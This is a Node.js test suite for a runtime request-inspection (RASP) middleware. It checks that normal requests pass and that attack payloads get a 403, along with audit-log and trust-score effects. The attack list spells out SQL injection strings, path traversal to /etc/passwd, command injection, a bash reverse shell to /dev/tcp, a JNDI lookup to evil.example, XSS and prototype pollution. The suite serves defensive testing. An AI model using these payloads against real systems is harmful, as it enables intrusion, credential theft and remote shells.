// Tests for the RASP middleware (runtime request inspection).
import { describe, it, beforeEach, before, after } from 'node:test';
import assert from 'node:assert/strict';
import express from 'express';
import { store } from '../store/index.js';
import { ACTIVITY_EVENT_TYPES } from '../../shared/contracts.js';
import { createRaspMiddleware } from '../middleware/raspMiddleware.js';
import { MongoMemoryReplSet } from 'mongodb-memory-server';
import { connectDatabase, disconnectDatabase } from '../database/connection.js';
import { seedApplications } from '../services/mongoService.js';
import realApp from '../app.js';

function buildApp(options = {}) {
  const app = express();
  app.use(express.json());
  app.use(createRaspMiddleware({ logger: null, ...options }));
  app.all('/api/apps/:id', (req, res) => res.json({ ok: true }));
  app.all('/api/echo', (req, res) => res.json({ ok: true }));
  return app;
}

async function listen(app) {
  return new Promise((resolve) => {
    const server = app.listen(0, () => resolve({ server, base: `http://localhost:${server.address().port}` }));
  });
}

const post = (base, path, body, raw = false) => fetch(`${base}${path}`, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: raw ? body : JSON.stringify(body),
});

describe('RASP middleware', () => {
  let server;
  let base;

  before(async () => {
    ({ server, base } = await listen(buildApp({ penaltyCooldownMs: 0 })));
  });
  after(() => new Promise((resolve) => server.close(resolve)));
  beforeEach(() => store.resetToSeed());

  describe('allows legitimate traffic', () => {
    const clean = [
      { appId: 'app_01', resource: 'location', reason: 'Show nearby restaurants and navigation' },
      { reason: "Don't track me; I'd like to select a resource from the list" },
      { reason: 'Union members can select all items from the menu' },
      { reason: 'Quote: "-- end" and 50% off, #1 pick' },
      { reason: 'Dogs; cat owners; bird watchers' },
      { reason: 'The operating system (Linux) needs location for maps.' },
      { note: 'wait... what? Really...' },
    ];
    for (const body of clean) {
      it(`passes ${JSON.stringify(body).slice(0, 60)}`, async () => {
        const res = await post(base, '/api/echo', body);
        assert.equal(res.status, 200);
      });
    }
  });

  describe('blocks attack payloads with 403 RASP_VIOLATION', () => {
    const attacks = {
      'SQLi UNION SELECT': { q: "x' UNION SELECT username, password FROM users--" },
      'SQLi tautology': { q: "' OR '1'='1" },
      'SQLi numeric tautology': { q: '1 OR 1=1' },
      'SQLi stacked drop': { q: "x'; DROP TABLE apps;--" },
      'SQLi comment-obfuscated': { q: 'UNION/**/SELECT/**/1' },
      'SQLi URL double-encoded': { q: '%2527%2520OR%25201%253D1' },
      'SQLi time based': { q: "1' AND SLEEP(5)#" },
      'path traversal': { file: '../../etc/passwd' },
      'path traversal encoded': { file: '..%2f..%2fetc%2fshadow' },
      'null byte': { file: 'report.pdf%00.png' },
      'command chain': { host: '8.8.8.8; cat /etc/passwd' },
      'command substitution': { host: '$(whoami)' },
      'reverse shell': { host: 'x | bash -i >& /dev/tcp/10.0.0.1/4444' },
      'eval': { expr: 'eval(process.mainModule.require("child_process"))' },
      'jndi': { ua: '${jndi:ldap://evil.example/a}' },
      'script tag': { bio: '<script>alert(1)</script>' },
      'nosql operator': { appId: { $ne: null } },
      'protected field': { trustScore: 100 },
      'role escalation': { role: 'admin' },
    };
    for (const [name, body] of Object.entries(attacks)) {
      it(name, async () => {
        const res = await post(base, '/api/echo', body);
        assert.equal(res.status, 403, `expected block for ${name}`);
        const json = await res.json();
        assert.equal(json.success, false);
        assert.equal(json.error.code, 'RASP_VIOLATION');
        assert.ok(res.headers.get('x-rasp-violation-id'));
      });
    }

    it('blocks prototype pollution sent as raw JSON', async () => {
      const res = await post(base, '/api/echo', '{"__proto__":{"isAdmin":true}}', true);
      assert.equal(res.status, 403);
    });

    it('blocks attacks in query string and route path', async () => {
      const q = await fetch(`${base}/api/echo?name=${encodeURIComponent("' OR 1=1--")}`);
      assert.equal(q.status, 403);
      const p = await fetch(`${base}/api/apps/..%2f..%2fetc%2fpasswd`);
      assert.equal(p.status, 403);
    });

    it('blocks HTTP parameter pollution on scalar query keys', async () => {
      const res = await fetch(`${base}/api/echo?appId=app_01&appId=app_02`);
      assert.equal(res.status, 403);
    });

    it('blocks excessively nested payloads', async () => {
      let nested = 'x';
      for (let i = 0; i < 30; i += 1) nested = { a: nested };
      const res = await post(base, '/api/echo', nested);
      assert.equal(res.status, 403);
    });

    it('does not leak the payload or rule in the response', async () => {
      const res = await post(base, '/api/echo', { q: "x' UNION SELECT 1--" });
      const text = await res.text();
      assert.ok(!/union|select|sqli/i.test(text));
    });
  });

  describe('audit + trust score integration', () => {
    it('records ACCESS_DENIED and ALERT_CREATED against the app and lowers trustScore', async () => {
      const before = store.getApp('app_01').trustScore;
      const res = await post(base, '/api/echo', { appId: 'app_01', reason: "x'; DROP TABLE apps;--" });
      assert.equal(res.status, 403);

      const entries = store.history.filter((h) => h.appId === 'app_01' && h.metadata?.source === 'rasp');
      const types = entries.map((e) => e.eventType);
      assert.ok(types.includes(ACTIVITY_EVENT_TYPES.ACCESS_DENIED));
      assert.ok(types.includes(ACTIVITY_EVENT_TYPES.ALERT_CREATED));
      const denied = entries.find((e) => e.eventType === ACTIVITY_EVENT_TYPES.ACCESS_DENIED);
      assert.equal(denied.metadata.category, 'sql_injection');
      assert.equal(denied.metadata.attributed, true);

      const after = store.getApp('app_01').trustScore;
      assert.ok(after < before, `trust ${before} -> ${after}`);
      assert.ok(store.history.some((h) => h.appId === 'app_01' && h.eventType === ACTIVITY_EVENT_TYPES.TRUST_SCORE_CHANGED));
    });

    it('attributes via route path when no appId in payload', async () => {
      const before = store.getApp('app_01').trustScore;
      await fetch(`${base}/api/apps/app_01?x=${encodeURIComponent('$(whoami)')}`);
      assert.ok(store.getApp('app_01').trustScore < before);
    });

    it('logs unattributed violations under the system bucket and changes no scores', async () => {
      const scores = store.apps.map((a) => a.trustScore);
      await post(base, '/api/echo', { reason: '../../etc/passwd' });
      const entry = store.history.find((h) => h.metadata?.source === 'rasp');
      assert.equal(entry.appId, 'system');
      assert.equal(entry.metadata.attributed, false);
      assert.deepEqual(store.apps.map((a) => a.trustScore), scores);
    });

    it('ignores spoofed / unknown appIds (no penalty, no crash)', async () => {
      const res = await post(base, '/api/echo', { appId: "nope'; DROP TABLE x;--", reason: '1 OR 1=1' });
      assert.equal(res.status, 403);
      const res2 = await post(base, '/api/echo', { appId: 'app_does_not_exist', reason: '1 OR 1=1' });
      assert.equal(res2.status, 403);
    });

    it('applies at most one trust penalty per app per cooldown window', async () => {
      const { server: s, base: b } = await listen(buildApp({ penaltyCooldownMs: 60000 }));
      try {
        const start = store.getApp('app_01').trustScore;
        await post(b, '/api/echo', { appId: 'app_01', q: '1 OR 1=1' });
        const afterFirst = store.getApp('app_01').trustScore;
        await post(b, '/api/echo', { appId: 'app_01', q: '1 OR 1=1' });
        await post(b, '/api/echo', { appId: 'app_01', q: '1 OR 1=1' });
        assert.ok(afterFirst < start);
        assert.equal(store.getApp('app_01').trustScore, afterFirst);
        // every attempt is still audited
        const denied = store.history.filter((h) => h.eventType === ACTIVITY_EVENT_TYPES.ACCESS_DENIED && h.metadata?.source === 'rasp');
        assert.equal(denied.length, 3);
      } finally {
        await new Promise((r) => s.close(r));
      }
    });
  });

  describe('modes and options', () => {
    it('monitor mode logs but does not block or penalise', async () => {
      const { server: s, base: b } = await listen(buildApp({ mode: 'monitor', penaltyCooldownMs: 0 }));
      try {
        const before = store.getApp('app_01').trustScore;
        const res = await post(b, '/api/echo', { appId: 'app_01', q: '1 OR 1=1' });
        assert.equal(res.status, 200);
        assert.equal(store.getApp('app_01').trustScore, before);
        assert.ok(store.history.some((h) => h.metadata?.source === 'rasp' && h.metadata.mode === 'monitor'));
      } finally {
        await new Promise((r) => s.close(r));
      }
    });

    it('can be disabled', async () => {
      const { server: s, base: b } = await listen(buildApp({ enabled: false }));
      try {
        const res = await post(b, '/api/echo', { q: '1 OR 1=1' });
        assert.equal(res.status, 200);
      } finally {
        await new Promise((r) => s.close(r));
      }
    });
  });

  describe('mounted in the real EDITH app', () => {
    let realServer;
    let realBase;
    let replicaSet;
    before(async () => {
      replicaSet = await MongoMemoryReplSet.create({ replSet: { count: 1 } });
      await connectDatabase(replicaSet.getUri('edith_rasp_test'));
      await seedApplications();
      ({ server: realServer, base: realBase } = await listen(realApp));
    });
    after(async () => {
      await new Promise((resolve) => realServer.close(resolve));
      await disconnectDatabase();
      await replicaSet.stop();
    });

    it('still serves a normal simulate request', async () => {
      const res = await post(realBase, '/api/events/simulate', { appId: 'app_01', resource: 'location', reason: 'Navigation' });
      assert.equal(res.status, 200);
    });

    it('blocks an injection against the simulate endpoint', async () => {
      const res = await post(realBase, '/api/events/simulate', { appId: 'app_01', resource: 'location', reason: "x' OR '1'='1" });
      assert.equal(res.status, 403);
      assert.equal((await res.json()).error.code, 'RASP_VIOLATION');
    });
  });
});